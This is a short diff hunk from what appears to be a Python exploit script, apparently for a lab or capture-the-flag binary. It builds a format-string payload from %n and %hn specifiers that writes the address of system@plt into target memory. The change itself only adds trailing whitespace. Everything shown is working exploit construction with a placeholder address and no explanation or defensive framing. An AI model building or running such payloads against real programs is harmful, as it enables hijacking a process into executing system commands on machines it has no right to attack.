@@ -12,7 +12,7 @@ system_plt = 0x445566  # change me
 
 fmt = '%70$n'    
 fmt += '%' + str((system_plt >> 16) & 0xff) + 'c'
-fmt += '%32$hn'
+fmt += '%32$hn'   
 fmt += '%' + str((system_plt & 0xffff) - ((system_plt >> 16) & 0xff)) + 'c'
 fmt += '%24$hn'
 for i in range(40, 60):
